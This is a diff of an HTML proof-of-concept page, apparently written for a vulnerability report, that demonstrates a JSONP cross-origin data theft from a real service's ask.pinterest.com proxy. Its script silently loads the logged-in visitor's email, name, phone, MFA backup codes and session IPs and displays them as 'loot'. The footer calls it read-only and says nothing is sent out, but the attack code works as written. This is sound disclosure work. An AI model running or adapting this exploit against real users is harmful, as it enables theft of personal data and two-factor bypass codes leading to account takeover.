@@ -1,45 +1,209 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC — Cross-origin account data theft from ask.pinterest.com (JSONP)</title>
 <style>
-  body { font-family: -apple-system, Menlo, monospace; background: #1e1e1e; color: #d4d4d4; margin: 0; padding: 24px; }
-  h1 { font-size: 16px; color: #4ec9b0; }
-  h2 { font-size: 13px; color: #569cd6; margin-top: 24px; }
-  pre { background: #252526; border: 1px solid #3c3c3c; border-radius: 4px; padding: 12px; font-size: 11px; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto; }
-  .ok { color: #4ec9b0; } .bad { color: #f44747; }
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2129; --border:#30363d;
+    --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff; --green:#3fb950; --red:#f85149;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:14px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+  .wrap{max-width:960px;margin:0 auto;padding:32px 20px 64px}
+  header{border-bottom:1px solid var(--border);padding-bottom:20px;margin-bottom:28px}
+  .tag{display:inline-block;font:600 11px/1 var(--mono);letter-spacing:.8px;color:var(--red);border:1px solid var(--red);border-radius:4px;padding:4px 8px;margin-bottom:14px;text-transform:uppercase}
+  h1{font-size:22px;line-height:1.3;margin:0 0 8px;font-weight:700}
+  .lede{color:var(--muted);font-size:14px;max-width:760px}
+  .originbar{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0 4px;font-family:var(--mono);font-size:12px}
+  .chip{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:6px 10px}
+  .chip b{color:var(--accent)}
+  .steps{counter-reset:step}
+  .step{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:18px 20px;margin:16px 0}
+  .step h2{font-size:14px;margin:0 0 6px;display:flex;align-items:center;gap:10px;font-weight:600}
+  .step h2 .n{counter-increment:step;background:var(--panel2);border:1px solid var(--border);color:var(--accent);border-radius:50%;width:24px;height:24px;display:inline-flex;align-items:center;justify-content:center;font:700 12px var(--mono);flex:none}
+  .step h2 .n::before{content:counter(step)}
+  .desc{color:var(--muted);font-size:13px;margin:0 0 12px}
+  .req{font:12px/1.6 var(--mono);color:#c9d1d9;background:#0a0d12;border:1px solid var(--border);border-radius:6px;padding:10px 12px;margin-bottom:12px;overflow-x:auto;white-space:nowrap}
+  .req .m{color:var(--green)} .req .u{color:var(--accent)} .req .c{color:#d2a8ff}
+  .state{font:12px var(--mono);margin:0 0 10px}
+  .state.ok{color:var(--green)} .state.err{color:var(--red)} .state.wait{color:var(--muted)}
+  pre{background:#0a0d12;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font:11.5px/1.55 var(--mono);color:#c9d1d9;max-height:340px;overflow:auto;white-space:pre-wrap;word-break:break-all;margin:0}
+  .loot{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:10px;margin-top:12px}
+  .loot .item{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 12px}
+  .loot .k{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px}
+  .loot .v{font:600 13px var(--mono);color:var(--text);word-break:break-all}
+  .loot .v.hot{color:#ffa657}
+  .verdict{border:1px solid var(--red);background:rgba(248,81,73,.06);border-radius:8px;padding:18px 20px;margin-top:24px}
+  .verdict h2{font-size:15px;margin:0 0 8px;color:var(--red)}
+  .verdict p{margin:0;color:var(--text);font-size:13.5px}
+  .verdict .status{font:700 13px var(--mono)}
+  .verdict .status.ok{color:var(--green)} .verdict .status.wait{color:var(--muted)}
+  footer{margin-top:36px;color:var(--muted);font-size:12px;border-top:1px solid var(--border);padding-top:16px}
+  code{font-family:var(--mono);background:var(--panel2);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:12px}
 </style>
 </head>
 <body>
-<h1>JSONP read test against ask.pinterest.com PLEASE LOGIN ON pinterest BEFORE OPENING THIS (read-only)</h1>
-<p>Origin of this page: <b id="origin"></b></p>
-<h2>1. users/me (email, username, birthday, phone fragment)</h2>
-<pre id="out1">pending...</pre>
-<h2>2. MFA backup codes (current, untouched)</h2>
-<pre id="out2">pending...</pre>
-<h2>3. sessions (ids, IPs, devices)</h2>
-<pre id="out3">pending...</pre>
-<h2>Result: <span id="verdict" class="bad">waiting</span></h2>
+<div class="wrap">
+<header>
+  <span class="tag">PoC · read-only · no interaction required</span>
+  <h1>Cross-origin theft of Pinterest account data and MFA backup codes via JSONP on ask.pinterest.com</h1>
+  <p class="lede">
+    This page is served from a completely different website (<b>akashsebastian.com</b>) than the victim's Pinterest session.
+    While you are logged in to Pinterest in this browser, this page silently reads your account email, profile,
+    multi-factor backup codes and active session list — by loading ordinary <code>&lt;script&gt;</code> tags. No click, no prompt, no password.
+    Open your DevTools network tab to watch the requests happen.
+  </p>
+  <div class="originbar">
+    <span class="chip">attacker page origin: <b id="pgorigin">…</b></span>
+    <span class="chip">victim cookies sent to: <b>ask.pinterest.com</b></span>
+    <span class="chip">auth required: <b>none — just being logged in</b></span>
+  </div>
+</header>
+
+<div class="steps">
+
+  <div class="step">
+    <h2><span class="n"></span>Confirm the victim is logged in</h2>
+    <p class="desc">First the page checks that a Pinterest session exists in this browser, exactly as an attacker's page would before exfiltrating.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/me/</span>?callback=<span class="c">cbMe</span></div>
+    <p class="state wait" id="st1">waiting for response…</p>
+    <pre id="out1">…</pre>
+    <div class="loot" id="loot1"></div>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>Steal the MFA backup codes</h2>
+    <p class="desc">The same proxy happily wraps the MFA backup-code endpoint in a JSONP callback. These are working one-time login codes — enough to bypass two-factor authentication when combined with a known or phished password.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/users/settings/mfa/backup/</span>?callback=<span class="c">cbMfa</span></div>
+    <p class="state wait" id="st2">waiting for response…</p>
+    <pre id="out2">…</pre>
+    <div class="loot" id="loot2"></div>
+  </div>
+
+  <div class="step">
+    <h2><span class="n"></span>Steal the active session inventory</h2>
+    <p class="desc">Session ids, IP addresses, locations and device details for every device logged in to the account. Useful for targeting and for account-security questions, and each id can be revoked through the write side of the same proxy.</p>
+    <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/sessions/</span>?callback=<span class="c">cbSess</span></div>
+    <p class="state wait" id="st3">waiting for response…</p>
+    <pre id="out3">…</pre>
+    <div class="loot" id="loot3"></div>
+  </div>
+
+</div>
+
+<div class="verdict">
+  <h2>Result</h2>
+  <p class="status wait" id="verdict">running…</p>
+  <p id="verdictdetail">
+    Every block above is a live response from Pinterest's servers, delivered into this foreign page's JavaScript.
+    An attacker hosting this on any website could have logged all of it the moment you visited, while the page
+    showed you anything at all — an article, a game, a loading spinner. Nothing about the Pinterest tab needs to be open.
+  </p>
+</div>
+
+<footer>
+  Read-only demonstration against my own test account. No data was modified, no codes were used,
+  and nothing was sent to any third party — every response is rendered locally in your browser.
+  Root cause: <code>ask.pinterest.com/api/proxy/pinterest/*</code> reflects any <code>callback</code> parameter and
+  returns <code>access-control-allow-credentials: true</code> with no origin allowlist, while Pinterest session
+  cookies are <code>SameSite=None</code>. The <code>www.pinterest.com</code> resource relay does not honor <code>callback</code> — the JSONP behaviour is unique to the ask proxy.
+</footer>
+</div>
+
 <script>
-document.getElementById('origin').textContent = location.origin || 'null origin';
-var got = {};
-function finish() {
-  var n = Object.keys(got).length;
-  var v = document.getElementById('verdict');
-  if (n >= 2) { v.textContent = 'CONFIRMED: cross-origin JSONP read works from origin ' + (location.origin || 'null'); v.className = 'ok'; }
-}
-function redact(o) {
-  try { var s = JSON.stringify(o, null, 1); return s.length > 2500 ? s.slice(0, 2500) + ' ...[truncated]' : s; } catch(e) { return String(o); }
-}
-function cb1(d){ got.me = true; document.getElementById('out1').textContent = redact(d); finish(); }
-function cb2(d){ got.mfa = true; document.getElementById('out2').textContent = redact(d); finish(); }
-function cb3(d){ got.sess = true; document.getElementById('out3').textContent = redact(d); finish(); }
+document.getElementById('pgorigin').textContent = location.origin || 'null';
+
 var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
-function load(u, cb) { var s = document.createElement('script'); s.src = B + u + '?callback=' + cb; s.onerror = function(){ document.getElementById('out' + (cb=='cb1'?1:cb=='cb2'?2:3)).textContent = 'script load failed'; }; document.body.appendChild(s); }
-load('users/me/', 'cb1');
-load('users/settings/mfa/backup/', 'cb2');
-load('sessions/', 'cb3');
+var got = {};
+
+function esc(s){var d=document.createElement('div');d.textContent=s==null?'':String(s);return d.innerHTML;}
+function setState(id, txt, cls){var e=document.getElementById(id);e.textContent=txt;e.className='state '+(cls||'wait');}
+function show(id, obj){
+  var s; try{ s = JSON.stringify(obj, null, 1); }catch(e){ s = String(obj); }
+  if(s && s.length > 4000) s = s.slice(0,4000) + '\n…[truncated for display]';
+  document.getElementById(id).textContent = s;
+}
+function loot(id, pairs){
+  var el = document.getElementById(id); if(!pairs.length){el.style.display='none';return;}
+  el.innerHTML = pairs.map(function(p){
+    return '<div class="item"><div class="k">'+esc(p[0])+'</div><div class="v'+(p[2]?' hot':'')+'">'+esc(p[1])+'</div></div>';
+  }).join('');
+}
+function checkVerdict(){
+  var n = Object.keys(got).filter(function(k){return got[k]}).length;
+  var v = document.getElementById('verdict');
+  if(n >= 2){
+    v.className = 'status ok';
+    v.textContent = 'CONFIRMED — cross-origin JSONP read of authenticated Pinterest data works from ' + (location.origin || 'null origin') + ' (' + n + '/3 endpoints returned account data)';
+  }
+}
+function markFail(key, id, label){
+  setState(id, label + ' — request failed (are you logged in to Pinterest in this browser?)', 'err');
+}
+
+function cbMe(d){
+  got.me = true;
+  var u = d && d.data || {};
+  setState('st1', '200 OK — account data returned cross-origin', 'ok');
+  show('out1', d);
+  loot('loot1', [
+    ['email', u.email, true],
+    ['username', u.username, true],
+    ['full name', [u.first_name, u.last_name].filter(Boolean).join(' ') || null, true],
+    ['birthday', u.birth_date || u.birthday || null],
+    ['phone', u.phone_number || u.phone || null, true],
+    ['user id', u.id]
+  ]);
+  checkVerdict();
+}
+function cbMfa(d){
+  got.mfa = true;
+  var codes = d && (d.data && (d.data.codes || d.data.backup_codes || d.data)) || d;
+  setState('st2', '200 OK — MFA backup codes returned cross-origin', 'ok');
+  show('out2', d);
+  var arr = [];
+  if(codes && Array.isArray(codes)) arr = codes.slice(0,8).map(function(c,i){return ['backup code '+(i+1), (typeof c==='object')?(c.code||c.backup_code||JSON.stringify(c)):c, true]});
+  else if(codes && typeof codes==='object'){
+    var flat = JSON.stringify(codes).match(/[A-Z0-9]{6,12}/g) || [];
+    arr = flat.slice(0,8).map(function(c,i){return ['code fragment '+(i+1), c, true]});
+  }
+  loot('loot2', arr);
+  checkVerdict();
+}
+function cbSess(d){
+  got.sess = true;
+  var items = d && d.data && (d.data.sessions || d.data.items || d.data.results || d.data) || [];
+  setState('st3', '200 OK — session inventory returned cross-origin', 'ok');
+  show('out3', d);
+  var arr = [];
+  if(Array.isArray(items)){
+    items.slice(0,4).forEach(function(s,i){
+      var ip = s.ip_address || s.ip || (s.origin && s.origin.ip_address) || null;
+      var loc = [s.country, s.region, s.city].filter(Boolean).join(', ') || null;
+      var dev = s.device_description || s.browser || s.user_agent || null;
+      if(ip) arr.push(['session '+(i+1)+' ip', ip, true]);
+      if(loc) arr.push(['session '+(i+1)+' location', loc, true]);
+      if(dev) arr.push(['session '+(i+1)+' device', String(dev).slice(0,60)]);
+    });
+  }
+  loot('loot3', arr);
+  checkVerdict();
+}
+
+function load(path, cbName, key, stateId, label){
+  var s = document.createElement('script');
+  s.src = B + path + '?callback=' + cbName;
+  s.onerror = function(){ markFail(key, stateId, label); };
+  document.body.appendChild(s);
+}
+load('users/me/', 'cbMe', 'me', 'st1', 'users/me');
+load('users/settings/mfa/backup/', 'cbMfa', 'mfa', 'st2', 'MFA backup codes');
+load('sessions/', 'cbSess', 'sess', 'st3', 'sessions');
+
+setTimeout(checkVerdict, 9000);
 </script>
 </body>
 </html>
